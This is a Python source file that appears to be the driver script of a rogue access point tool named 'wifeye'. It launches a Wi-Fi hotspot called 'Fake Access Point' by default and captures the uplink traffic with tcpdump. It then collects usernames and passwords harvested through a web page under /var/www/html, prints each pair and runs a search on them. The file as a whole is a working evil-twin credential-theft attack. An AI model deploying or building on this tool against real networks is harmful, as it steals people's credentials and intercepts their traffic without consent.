from argparse import ArgumentParser
from pwparser import search, read_cp_output_lines
import shutil
import os
import hotspotSetup
import config

def removeFileExtension(fileName:str):
	periodIndex = fileName.find(".")
	return fileName[:periodIndex]

def main():
	parser = ArgumentParser()
	parser.add_argument('-n', '--name', default='Fake Access Point')
	parser.add_argument('-o', '--output', default='output')
	parser.add_argument('-d', '--database') #default reads from different kind of file
	parser.add_argument('-w', '--wifiInterface', default='wlan0')
	parser.add_argument('-i', '--internetInterface', default='eth0')

	args = parser.parse_args()
	print(args)

	setupSuccess = hotspotSetup.performSetup(config.DNSMASQ_TEMPLATE_FILE, config.HOSTAPD_TEMPLATE_FILE, config.HOTSPOT_SETUP_COMMANDS_TEMPLATE_FILE,
											 args.wifiInterface, args.internetInterface, args.name, config.HOSTAPD_DRIVER)
	fileNameRaw = removeFileExtension(args.output)
	os.system("nohup tcpdump --interface {internetInferface} -w {output} &".format(internetInferface = args.internetInterface, output = fileNameRaw + ".pcap"))

	if not setupSuccess:
		print("Failed to setup the hotspot, check the arguments passed in")
		return

	input("Press Enter to continue...")
	shutil.copy('/var/www/html/wifeyeData.txt', os.path.abspath(args.output))
	#stop tcpdump
	os.system("kill $(ps -e | pgrep tcpdump)")

	users = read_cp_output_lines(os.path.abspath(args.output))
	for user in users:
		info = user.split()
		print("considering user, password pair: " + info[1] + ", " + info[2])
		search(args, [info[1],info[2]])
	print("Done!")

if __name__ == "__main__":
	main()
